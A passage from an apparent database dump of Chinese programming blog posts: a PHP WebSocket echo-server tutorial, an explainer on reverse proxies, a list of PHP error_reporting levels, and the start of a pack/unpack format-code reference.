style=&quot;background-color:#ffffff;text-indent:2em;&quot;&gt;接下来是字符串通信，客户端send过来一段字符串信息，服务器端接收到并返回给客户端这个字符串。&lt;/p&gt;&lt;p style=&quot;background-color:#ffffff;text-indent:2em;&quot;&gt;首先我们处理接收到的信息，根据上篇文章介绍的&lt;a href=&quot;http://blog.csdn.net/luochuan/article/details/7198619&quot; target=&quot;_blank&quot;&gt;数据传输格式&lt;/a&gt;，并firefox的FIN一直为1，RSV1,2,3为0，如果是文本消息，那么opcode为1，所以数据包的第一个数据是0x81，然后是一位mask值，firefox发来的数据是加了掩码的，所以mask值为1，后面跟7位是数据信息长度，我们以客户端发送hi为例，那么长度就是2个字节，则第二个数据就是0x82，这里没有约定扩展数据，所以不存在扩展数据长度字节，接下来是4个数据的掩码（&lt;span style=&quot;color:#339999&quot;&gt;因为我们这里是发送hi，2个字节的信息，小于125个字节，所以掩码是第3-第6个数据，根据数据长度的不同，掩码的位置也不同，如果取到那7位表示的值是126，则掩码为第5-第8个数据，如果取到那7位表示的值是127，则掩码为第11-第14个数据&lt;/span&gt;），后面跟客户端发送的内容数据，处理接收到的数据我们需要用取到的掩码依次轮流跟内容数据做异或(^)运算，第一个内容数据与第一个掩码异或，第二个内容数据与第二个掩码异或&hellip;&hellip;第五个内容数据与第一个掩码异或&hellip;&hellip;以此类推，一直到结束，然后对内容进行编码。&lt;/p&gt;&lt;p style=&quot;background-color:#ffffff;text-indent:2em;&quot;&gt;其次是服务器端发送给客户端的响应信息，数据格式跟接收的信息一样，只是我们不需要生成掩码，掩码位为0，后面也不存在4个掩码数据。&lt;/p&gt;&lt;p style=&quot;background-color:#ffffff;text-indent:2em;&quot;&gt;具体的PHP代码如下：&lt;/p&gt;&lt;p style=&quot;background-color:#ffffff;text-indent:2em;&quot;&gt;server.php&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&amp;lt;?php\r\n/**\r\n * php - websocket\r\n */\r\n                                              \r\nerror_reporting(E_ALL);\r\nset_time_limit(0);\r\nob_implicit_flush(true);\r\n                                              \r\ndate_default_timezone_set(&quot;Asia/shanghai&quot;);\r\n$sockets = array();\r\n$users   = array();\r\n                                              \r\n$master  = WebSocket(&quot;localhost&quot;,12345);\r\n$sockets[] = $master;\r\n                                              \r\nwhile(true){\r\n    $changed = $sockets;\r\n    socket_select($changed,$write=NULL,$except=NULL,NULL);\r\n    foreach ($changed as $socket) {\r\n        if ($socket == $master) {\r\n            $client=socket_accept($master);\r\n            if ($client !== false) {\r\n                skConnect($client);\r\n            }\r\n        } else {\r\n            $data = @socket_recv($socket,$buffer,2048,0);\r\n                                                          \r\n            if ($data != 0) {\r\n                $user = getuserbysocket($socket);\r\n                                                              \r\n                if (!$user-&amp;gt;handshake) {\r\n                    dohandshake($user,$buffer);\r\n                } else {\r\n                    process($socket,$buffer);\r\n                }\r\n            }\r\n        }\r\n    }\r\n                                              \r\n    sleep(1);\r\n}\r\n                                              \r\n//---------------------------------------------------------------\r\n                                              \r\nfunction WebSocket($address,$port) {\r\n    $master=socket_create(AF_INET, SOCK_STREAM, SOL_TCP)     or die(&quot;socket_create() failed&quot;);\r\n    socket_set_option($master, SOL_SOCKET, SO_REUSEADDR, 1)  or die(&quot;socket_option() failed&quot;);\r\n    socket_bind($master, $address, $port)                    or die(&quot;socket_bind() failed&quot;);\r\n    socket_listen($master,20)                                or die(&quot;socket_listen() failed&quot;);\r\n    echo &quot;Server Started : &quot;.date(&#039;Y-m-d H:i:s&#039;).&quot;&quot;;\r\n    echo &quot;Master socket  : &quot;.$master.&quot;&quot;;\r\n    echo &quot;Listening on   : &quot;.$address.&quot; port &quot;.$port.&quot;&quot;;\r\n    return $master;\r\n}\r\n                                              \r\nfunction getuserbysocket($socket){\r\n    global $users;\r\n    $found=null;\r\n    foreach($users as $user){\r\n        if($user-&amp;gt;socket==$socket){ $found=$user; break; }\r\n    }\r\n    return $found;\r\n}\r\n                                              \r\nfunction skConnect($socket){\r\n    global $sockets,$users;\r\n                                                  \r\n    $user = new User();\r\n                                                  \r\n    $user-&amp;gt;id = uniqid();\r\n    $user-&amp;gt;socket = $socket;\r\n                                                  \r\n    $users[] = $user;\r\n    $sockets[] = $socket;\r\n}\r\n                                              \r\nfunction disconnect($socket){\r\n    global $sockets,$users;\r\n    $found=null;\r\n    $n=count($users);\r\n    for($i=0;$i&amp;lt;$n;$i++){\r\n        if($users[$i]-&amp;gt;socket==$socket){ $found=$i; break; }\r\n    }\r\n    if(!is_null($found)){ array_splice($users,$found,1); }\r\n    $index = array_search($socket,$sockets);\r\n    socket_close($socket);\r\n    if($index&amp;gt;=0){ array_splice($sockets,$index,1); }\r\n}\r\n                                              \r\nfunction getheaders($req){\r\n    $r=$h=$o=null;\r\n    if(preg_match(&quot;/GET (.*) HTTP/1.1\r\n/&quot;   ,$req,$match)){ $r=$match[1]; }\r\n    if(preg_match(&quot;/Host: (.*)\r\n/&quot;  ,$req,$match)){ $h=$match[1]; }\r\n    if(preg_match(&quot;/Sec-WebSocket-Origin: (.*)\r\n/&quot;,$req,$match)){ $o=$match[1]; }\r\n    if(preg_match(&quot;/Sec-WebSocket-Key: (.*)\r\n/&quot;,$req,$match)){ $key=$match[1]; }\r\n    return array($r,$h,$o,$key);\r\n}\r\n                                              \r\nfunction dohandshake($user,$buffer){\r\n    list($resource,$host,$origin,$strkey) = getheaders($buffer);\r\n    $strkey .= &quot;258EAFA5-E914-47DA-95CA-C5AB0DC85B11&quot;;\r\n    $hash_data = base64_encode(sha1($strkey,true));\r\n                                                  \r\n    $upgrade  = &quot;HTTP/1.1 101 Switching Protocols\r\n&quot; .\r\n              &quot;Upgrade: websocket\r\n&quot; .\r\n              &quot;Connection: Upgrade\r\n&quot; .\r\n              &quot;Sec-WebSocket-Accept: &quot; . $hash_data . &quot;\r\n&quot; .\r\n              &quot;Sec-WebSocket-Protocol: websocket\r\n&quot; .\r\n              &quot;\r\n&quot;;\r\n                                                  \r\n    socket_write($user-&amp;gt;socket,$upgrade,strlen($upgrade));\r\n    $user-&amp;gt;handshake=true;\r\n    return true;\r\n}\r\n                                              \r\nfunction process($socket,$msg){\r\n    $action = unwrap($msg);\r\n    say(&quot;&amp;lt; &quot;.$action);\r\n    send($socket, $action);\r\n}\r\n                                              \r\nfunction send($client,$msg){\r\n    say(&quot;&amp;gt; &quot;.$msg);\r\n    $msg = wrap($msg);\r\n    socket_write($client,$msg,strlen($msg));\r\n    return true;\r\n}\r\n                                              \r\nfunction ord_hex($data)\r\n{\r\n    $msg = &quot;&quot;;\r\n    $l = strlen($data);\r\n                                              \r\n    for ($i= 0; $i&amp;lt; $l; $i++) {\r\n        $msg .= dechex(ord($data{$i}));\r\n    }\r\n                                              \r\n    return $msg;\r\n}\r\n                                              \r\nfunction wrap($msg=&quot;&quot;) {\r\n    $frame = array();\r\n    $frame[0] = &quot;81&quot;;\r\n    $msg .= &quot; is ok!&quot;;\r\n    $len = strlen($msg);\r\n    $frame[1] = $len&amp;lt;16?&quot;0&quot;.dechex($len):dechex($len);\r\n    $frame[2] = ord_hex($msg);\r\n    $data = implode(&quot;&quot;,$frame);\r\n    return pack(&quot;H*&quot;, $data);\r\n}\r\n                                              \r\nfunction unwrap($msg=&quot;&quot;) {\r\n    $mask = array();\r\n    $data = &quot;&quot;;\r\n    $msg = unpack(&quot;H*&quot;,$msg);\r\n                                                  \r\n    $head = substr($msg[1],0,2);\r\n                                                  \r\n    if (hexdec($head{1}) === 8) {\r\n        $data = false;\r\n    } else if (hexdec($head{1}) === 1) {\r\n        $mask[] = hexdec(substr($msg[1],4,2));\r\n        $mask[] = hexdec(substr($msg[1],6,2));\r\n        $mask[] = hexdec(substr($msg[1],8,2));\r\n        $mask[] = hexdec(substr($msg[1],10,2));\r\n                                                  \r\n        $s = 12;\r\n        $e = strlen($msg[1])-2;\r\n        $n = 0;\r\n        for ($i= $s; $i&amp;lt;= $e; $i+= 2) {\r\n            $data .= chr($mask[$n%4]^hexdec(substr($msg[1],$i,2)));\r\n            $n++;\r\n        }\r\n    }\r\n                                                  \r\n    return $data;\r\n}\r\n                                              \r\nfunction say($msg=&quot;&quot;){ print_r($msg.&quot;\r\n&quot;); }\r\n                                              \r\nclass User{\r\n    var $id;\r\n    var $socket;\r\n    var $handshake;\r\n}&lt;/pre&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;这里打包跟解包是用的pack跟unpack，当然还有很多其他的方式。&lt;/p&gt;&lt;p style=&quot;background-color:#ffffff;text-indent:2em;&quot;&gt;建立服务器需要在dos窗口下用PHP运行该server.php文件。&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;background-color:#ffffff;text-indent:2em;&quot;&gt;在网上搜到貌似一个成熟的phpwebsocket开源项目，有兴趣的同学下载来看看，地址：&lt;a href=&quot;https://github.com/nicokaiser/php-websocket&quot; target=&quot;_blank&quot;&gt;https://github.com/nicokaiser/php-websocket&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386303187),
(17, 17, '&lt;p style=&quot;text-indent:2em;&quot;&gt;反向代理（Reverse Proxy）方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器。&lt;span class=&quot;headline-content&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;反向代理 -概述&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;通常的&lt;a target=&quot;_blank&quot; href=&quot;http://baike.baidu.com/view/751.htm&quot;&gt;代理服务器&lt;/a&gt;，只用于代理内部网络对Internet的连接请求，客户机必须指定代理服务器,并将本来要直接发送到Web服务器上的http请求发送到代理服务器中。由于外部网络上的主机并不会配置并使用这个代理服务器，普通代理服务器也被设计为在Internet上搜寻多个不确定的服务器,而不是针对Internet上多个客户机的请求访问某一个固定的服务器，因此普通的Web代理服务器不支持外部对内部网络的访问请求。当一个代理服务器能够代理外部网络上的主机，访问内部网络时，这种代理服务的方式称为反向代理服务。此时代理服务器对外就表现为一个Web服务器，外部网络就可以简单把它当作一个标准的Web服务器而不需要特定的配置。不同之处在于，这个服务器没有保存任何网页的真实数据，所有的静态网页或者CGI程序，都保存在内部的Web服务器上。因此对反向代理服务器的攻击并不会使得网页信息遭到破坏，这样就增强了Web服务器的安全性。 　　&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;反向代理方式和包过滤方式或普通代理方式并无冲突，因此可以在&lt;a target=&quot;_blank&quot; href=&quot;http://baike.baidu.com/view/3067.htm&quot;&gt;防火墙&lt;/a&gt;设备中同时使用这两种方式，其中反向代理用于外部网络访问内部网络时使用，正向代理或包过滤方式用于拒绝其他外部访问方式并提供内部网络对外部网络的访问能力。因此可以结合这些方式提供最佳的安全访问方式。&lt;/p&gt;&lt;h2 style=&quot;text-indent:2em;&quot; class=&quot;headline-1 bk-sidecatalog-title&quot;&gt;&lt;a name=&quot;t1&quot;&gt;&lt;/a&gt;&lt;span class=&quot;headline-content&quot;&gt;代理服务器充当服务器&lt;/span&gt;&lt;/h2&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;如果您的内容服务器具有必须保持安全的敏感信息，如信用卡号数据库，可在防火墙外部设置一个代理服务器作为内容服务器的替身。当外部客户机尝试访问内容服务器时，会将其送到代理服务器。实际内容位于内容服务器上，在防火墙内部受到安全保护。代理服务器位于防火墙外部，在客户机看来就像是内容服务器。 　　当客户机向站点提出请求时，请求将转到代理服务器。然后，代理服务器通过防火墙中的特定通路，将客户机的请求发送到内容服务器。内容服务器再通过该通道将结果回传给代理服务器。代理服务器将检索到的信息发送给客户机，好像代理服务器就是实际的内容服务器（参见图 14-1）。如果内容服务器返回错误消息，代理服务器会先行截取该消息并更改标头中列出的任何 URL，然后再将消息发送给客户机。如此可防止外部客户机获取内部内容服务器的重定向 URL。 　　这样，代理服务器就在安全数据库和可能的恶意攻击之间提供了又一道屏障。与有权访问整个数据库的情况相对比，就算是侥幸攻击成功，作恶者充其量也仅限于访问单个事务中所涉及的信息。未经授权的用户无法访问到真正的内容服务器，因为防火墙通路只允许代理服务器有权进行访问。 　　&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;图 14-1 反向代理服务器就像是真正的内容服务器　　&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;可以配置&lt;a target=&quot;_blank&quot; href=&quot;http://baike.baidu.com/view/4550604.htm&quot;&gt;防火墙路由器&lt;/a&gt;，使其只允许特定端口上的特定服务器（在本例中为其所分配端口上的代理服务器）有权通过防火墙进行访问，而不允许其他任何机器进出。 　　安全反向代理 当代理服务器与其他机器之间有一个或多个连接使用安全套接字层 (SSL) 协议加密数据时，即会进行安全反向代理。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;img src=&quot;/uploads/Image/201312/06/1386303477_h5jrii_3884_0_1327820463Xncx.gif&quot; style=&quot;float:none;&quot; title=&quot;0_1327820463Xncx.gif&quot; /&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;img src=&quot;/uploads/Image/201312/06/1386303478_85eetc_3794_0_1327820508g9n8.gif&quot; style=&quot;float:none;&quot; title=&quot;0_1327820508g9n8.gif&quot; /&gt;&lt;/p&gt;&lt;h2 style=&quot;text-indent:2em;&quot; class=&quot;mar-t10&quot;&gt;&lt;a name=&quot;t2&quot;&gt;&lt;/a&gt;反向代理 -原理&lt;/h2&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;反向代理服务器位于本地WEB服务器和Internet之间。当用户浏览器发出一个&lt;a class=&quot;innerlink&quot; title=&quot;HTTP&quot; href=&quot;http://www.hudong.com/wiki/HTTP&quot;&gt;HTTP&lt;/a&gt;请求时，通过域名解析将请求定向到反向代理服务器（如果要实现多个WEB服务器的反向代理，需要将多个WEB服务器的域名都指向反向代理服务器）。由反向代理服务器处理器请求。反向代理一般只缓存可缓冲的数据（比如html网页和图片等），而一些&lt;a target=&quot;_blank&quot; class=&quot;innerlink&quot; title=&quot;CGI&quot; href=&quot;http://www.hudong.com/wiki/CGI&quot;&gt;CGI&lt;/a&gt;脚本程序或者ASP之类的程序不缓存。它根据从WEB服务器返回的HTTP头标记来缓冲静态页面。有四个最重要HTTP头标记：&lt;br /&gt;Last-Modified: 告诉反向代理页面什么时间被修改 &lt;br /&gt;Expires: 告诉反向代理页面什么时间应该从缓冲区中删除 &lt;br /&gt;Cache-Control: 告诉反向代理页面是否应该被缓冲 &lt;br /&gt;Pragma: 告诉反向代理页面是否应该被缓冲. &lt;br /&gt;&lt;br /&gt;例如：在默认情况下，ASP页面返回&rdquo; Cache-control: private.&rdquo; ，所以ASP页面时不会在反向代理服务器缓存的 &lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;&lt;h2 style=&quot;text-indent:2em;&quot; class=&quot;headline-1 bk-sidecatalog-title&quot;&gt;&lt;a name=&quot;t3&quot;&gt;&lt;/a&gt;&lt;span class=&quot;headline-content&quot;&gt;安全反向代理的用途&lt;/span&gt;&lt;/h2&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;安全反向代理有许多用途： 　　&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;可以提供从防火墙外部代理服务器到防火墙内部安全内容服务器的加密连接。　　&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;可以允许客户机安全地连接到代理服务器，从而有利于安全地传输信息（如信用卡号）。　　&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;安全反向代理会造成各安全连接因加密数据所涉及的&lt;a target=&quot;_blank&quot; href=&quot;http://baike.baidu.com/view/860875.htm&quot;&gt;系统开销&lt;/a&gt;而变慢。但是，由于 SSL 提供了高速缓存机制，所以连接双方可以重复使用先前协商的安全参数，从而大大降低后续连接的系统开销。&lt;br /&gt;&lt;/p&gt;&lt;h2 style=&quot;text-indent:2em;&quot; class=&quot;mar-t10&quot;&gt;&lt;a name=&quot;t4&quot;&gt;&lt;/a&gt;反向代理 -比较&lt;/h2&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;下面将对几种典型的代理服务作一个简单的比较。在网络上常见的代理服务器有三种： &lt;br /&gt;&lt;br /&gt;1． 标准的代理缓冲服务器 &lt;br /&gt;一个标准的代理缓冲服务被用于缓存静态的网页（例如：html文件和图片文件等）到本地网络上的一台主机上（即代理服务器）。当被缓存的页面被第二次访问的时候，浏览器将直接从本地代理服务器那里获取请求数据而不再向原web站点请求数据。这样就节省了宝贵的网络带宽，而且提高了访问速度。但是，要想实现这种方式，必须在每一个内部主机的浏览器上明确指明代理服务器的IP地址和端口号。客户端上网时，每次都把请求送给代理服务器处理，代理服务器根据请求确定是否连接到远程web服务器获取数据。如果在本地缓冲区有目标文件，则直接将文件传给用户即可。如果没有的话则先取回文件，先在本地保存一份缓冲，然后将文件发给客户端浏览器。&lt;br /&gt;&lt;br /&gt;2． 透明代理缓冲服务器 &lt;br /&gt;透明代理缓冲服务和标准代理服务器的功能完全相同。但是，代理操作对客户端的浏览器是透明的（即不需指明代理服务器的IP和端口）。透明代理服务器阻断网络通信，并且过滤出访问外部的HTTP（80端口）流量。如果客户端的请求在本地有缓冲则将缓冲的数据直接发给用户，如果在本地没有缓冲则向远程web服务器发出请求，其余操作和标准的代理服务器完全相同。对于Linux操作系统来说，透明代理使用Iptables或者Ipchains实现。因为不需要对浏览器作任何设置，所以，透明代理对于ISP（Internet服务器提供商）特别有用。&lt;br /&gt;&lt;br /&gt;3． 反向代理缓冲服务器 &lt;br /&gt;反向代理是和前两种代理完全不同的一种代理服务。使用它可以降低原始WEB服务器的负载。反向代理服务器承担了对原始WEB服务器的静态页面的请求，防止原始服务器过载。它位于本地WEB服务器和Internet之间，处理所有对WEB服务器的请求，组织了WEB服务器和Internet的直接通信。如果互联网用户请求的页面在代理服务器上有缓冲的话，代理服务器直接将缓冲内容发送给用户。如果没有缓冲则先向WEB服务器发出请求，取回数据，本地缓存后再发送给用户。这种方式通过降低了向WEB服务器的请求数从而降低了WEB服务器的负载。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;参考地址：&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://www.hudong.com/wiki/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86&quot;&gt;http://www.hudong.com/wiki/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86&lt;/a&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://baike.baidu.com/view/1165595.htm&quot;&gt;http://baike.baidu.com/view/1165595.htm&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386486571),
(18, 18, '&lt;p&gt;PHP中通过设置error_reporting的参数值可以控制错误报告级别，当然你可以在php.ini中配置也可以在PHP代码中动态修改。&lt;/p&gt;&lt;p&gt;下面是error_reporting的参数值列表，以作备忘：&lt;br /&gt;&lt;/p&gt;&lt;p&gt;; E_ALL &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; - 所有错误和警告 (不包含 E_STRICT)&lt;br /&gt;; E_ERROR &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; - 致命的运行时错误&lt;br /&gt;; E_RECOVERABLE_ERROR &amp;nbsp;- 几乎致命的运行时错误&lt;br /&gt;; E_WARNING &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; - 运行时警告 (非致命错误)&lt;br /&gt;; E_PARSE &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; - 编译时语法错误&lt;br /&gt;; E_NOTICE &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;- 运行时提醒 (这些警告常常由你代码中的bug导致, 但是也有可能是有意的行为 (例如, 使用一个未初始化的变量并依赖于其会被自动初始化成为一个空字符串的事实)&lt;br /&gt;; E_STRICT &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;- 运行时提醒, 打开后PHP会给出针对你代码的最易移植和最好向后兼容性的建议&lt;br /&gt;; E_CORE_ERROR &amp;nbsp; &amp;nbsp; &amp;nbsp;- PHP初始化启动时的致命错误&lt;br /&gt;; E_CORE_WARNING &amp;nbsp; &amp;nbsp;- 在PHP初始化时发生的警告 (非致命错误)&lt;br /&gt;; E_COMPILE_ERROR &amp;nbsp; - 致命的编译时错误&lt;br /&gt;; E_COMPILE_WARNING - 编译时警告 (非致命)&lt;br /&gt;; E_USER_ERROR &amp;nbsp; &amp;nbsp; &amp;nbsp;- 用户产生的错误信息&lt;br /&gt;; E_USER_WARNING &amp;nbsp; &amp;nbsp;- 用户产生的警告信息&lt;br /&gt;; E_USER_NOTICE &amp;nbsp; &amp;nbsp; - 用户产生的提示信息&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;例子：&lt;/p&gt;&lt;p&gt;&lt;br /&gt;error_reporting = E_ALL | E_STRICT &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;- 显示所有错误&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;error_reporting = E_ALL &amp;amp; ~E_NOTICE &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;- 显示所有错误, 除了提示以及代码标准警告以外&lt;br /&gt;&lt;br /&gt;error_reporting = E_ALL &amp;amp; ~E_NOTICE | E_STRICT &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;- 显示所有错误,除了提示以外&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;在PHP代码中加入error_reporting(0)，屏蔽所有的错误提示&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386428911),
(19, 19, '&lt;p&gt;前面在研究websocket的时候用到了pack跟unpack方法，这两个方法一直让我感觉起来比较深奥，当时从网上找了很多资料来研究，现在把这两个函数的使用方法以及参数介绍记下来，以作备忘&lt;/p&gt;&lt;p&gt;先看pack方法的说明：&lt;/p&gt;&lt;p&gt;pack -- 将数据打包成二进制字符串&lt;br /&gt;语法：string pack(string format, mixed [args]...);&lt;br /&gt;参数一：format参数表示以什么格式格式化数据&lt;br /&gt;参数二：将被格式化的数据&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;参数一的可选值：&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;table class=&quot;doctable table&quot;&gt;&lt;tbody class=&quot;tbody&quot; valign=&quot;center&quot;&gt;&lt;tr valign=&quot;center&quot;&gt;&lt;td align=&quot;left&quot;&gt;a&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;NUL-padded string&lt;br /&gt;&lt;span style=&quot;color:#990000&quot;&gt;NULL填充字符串空白格式，返回1位，默认读取10进制数据&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr valign=&quot;center&quot;&gt;&lt;td align=&quot;left&quot;&gt;A&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;SPACE-padded string&lt;br /&gt;&lt;span style=&quot;color:#990000&quot;&gt;SPACE填充字符串空白格式，返回1位，默认读取10进制数据&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr valign=&quot;center&quot;&gt;&lt;td align=&quot;left&quot;&gt;h&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;Hex string, low nibble first&lt;br /&gt;&lt;span style=&quot;color:#990000&quot;&gt;十六进制格式，每次格4位，低四位在前，默认读取10进制数据&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr valign=&quot;center&quot;&gt;&lt;td align=&quot;left&quot;&gt;H&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;Hex string, high nibble first&lt;br /&gt;&lt;span style=&quot;color:#990000&quot;&gt;十六进制格式，每次格4位，高四位在前，默认读取10进制数据&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr valign=&quot;center&quot;&gt;&lt;td align=&quot;left&quot;&gt;c&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;signed char&lt;br /&gt;&lt;span style=&quot;color:#990000&quot;&gt;有符号字符格式，每次格8位，默认读取16进制数据&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr valign=&quot;center&quot;&gt;&lt;td align=&quot;left&quot;&gt;C&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;unsigned char&lt;br /&gt;&lt;span style=&quot;color:#990000&quot;&gt;无符号字符格式，每次格8位，默认读取16进制数据&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr valign=&quot;center&quot;&gt;&lt;td align=&quot;left&quot;&gt;s&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;signed short (always 16 bit, machine byte order)&lt;br /&gt;&lt;span style=&quot;color:#990000&quot;&gt;有符号短整型格式(每次格16位，以计算机字节顺序)，默认读取16进制数据&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr valign=&quot;center&quot;&gt;&lt;td align=&quot;left&quot;&gt;S&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;unsigned short (always 16 bit, machine byte order)&lt;br /&gt;&lt;span style=&quot;color:#990000&quot;&gt;无符号短整型格式(每次格16位，以计算机字节顺序)，默认读取16进制数据&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr valign=&quot;center&quot;&gt;&lt;td align=&quot;left&quot;&gt;n&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;unsigned short (always 16 bit, big endian byte order)&lt;br /&gt;&lt;span style=&quot;color:#990000&quot;&gt;无符号短整型(每次格16位，以低端地址存放高位数据顺序)，默认读取16进制数据&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr valign=&quot;center&quot;&gt;&lt;td align=&quot;left&quot;&gt;v&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;unsigned short (always 16 bit, little endian byte order)&lt;br /&gt;&lt;span style=&quot;color:#990000&quot;&gt;无符号短整型(每次格16位，以低端地址存放低位数据顺序)，默认读取16进制数据&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr valign=&quot;center&quot;&gt;&lt;td align=&quot;left&quot;&gt;i&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;signed integer (machine dependent size and byte order)&lt;br /&gt;&lt;span style=&quot;color:#990000&quot;&gt;有符号整形(每次格机器最大寻址位数的数据，以计算机字节顺序)，默认读取16进制数据&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr valign=&quot;center&quot;&gt;&lt;td align=&quot;left&quot;&gt;I&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;unsigned integer (machine dependent size and byte order)&lt;br /&gt;&lt;span style=&quot;color:#990000&quot;&gt;无符号整形(每次格机器最大寻址位数的数据，以计算机字节顺序)，默认读取16进制数据&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr valign=&quot;center&quot;&gt;&lt;td align=&quot;left&quot;&gt;l&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;signed long (always 32 bit, machine byte order)&lt;br /&gt;&lt;span style=&quot;color:#990000&quot;&gt;有符号长整型格式(每次格32位，以计算机字节顺序)，默认读取16进制数据&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr valign=&quot;center&quot;&gt;&lt;td align=&quot;left&quot;&gt;L&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;unsigned long (always 32 bit, machine byte order)&lt;br /&gt;&lt;span style=&quot;color:#990000&quot;&gt;无符号长整型格式(每次格32位，以计算机字节顺序)，默认读取16进制数据&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr valign=&quot;center&quot;&gt;&lt;td align=&quot;left&quot;&gt;N&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;unsigned long (always 32 bit, big endian byte order)&lt;br /&gt;&lt;span style=&quot;color:#990000&quot;&gt;无符号长整型格式(每次格32位，以低端地址存放高位数据顺序)，默认读取16进制数据&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr valign=&quot;center&quot;&gt;&lt;td align=&quot;left&quot;&gt;V&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;unsigned long (always 32 bit, little endian byte order)&lt;br /&gt;&lt;span style=&quot;color:#990000&quot;&gt;无符号长整型格式(每次格32位，以低端地址存放低位数据顺序)，默认读取16进制数据&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr valign=&quot;center&quot;&gt;&lt;td align=&quot;left&quot;&gt;f&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;float (machine dependent size and representation)&lt;br /&gt;单精度实型格式(取决于机器的最大寻址位数和表示)&lt;/td&gt;&lt;/tr&gt;&lt;tr valign=&quot;center&quot;&gt;&lt;td align=&quot;left&quot;&gt;d&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;double 